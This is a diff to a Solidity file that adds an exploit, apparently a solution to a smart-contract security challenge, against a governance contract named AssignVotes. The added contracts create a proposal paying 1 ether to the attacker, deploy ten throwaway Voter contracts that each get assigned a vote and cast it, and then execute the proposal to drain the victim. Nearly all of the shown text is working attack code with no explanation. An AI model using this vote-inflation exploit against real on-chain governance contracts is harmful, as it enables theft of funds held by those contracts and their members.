@@ -70,3 +70,38 @@ contract AssignVotes {
         require(success, "exec failed");
     }
 }
+
+contract AssignVotesAttacker {
+    constructor(address victim) {
+        AssignVotes(victim).createProposal(msg.sender, "", 1 ether);
+        uint256 proposalNum = AssignVotes(victim).proposalCounter() - 1;
+
+        for (uint8 i = 0; i < 2; i++) {
+            new Assigner(victim, proposalNum);
+        }
+
+        AssignVotes(victim).execute(proposalNum);
+    }
+}
+
+contract Assigner {
+    constructor(address victim, uint256 proposalNum) {
+        for (uint8 i = 0; i < 5; i++) {
+            Voter voter = new Voter(victim);
+            AssignVotes(victim).assign(address(voter));
+            voter.vote(proposalNum);
+        }
+    }
+}
+
+contract Voter {
+    AssignVotes public victim;
+
+    constructor(address _victim) {
+        victim = AssignVotes(_victim);
+    }
+
+    function vote(uint256 proposalNum) external {
+        victim.vote(proposalNum);
+    }
+}
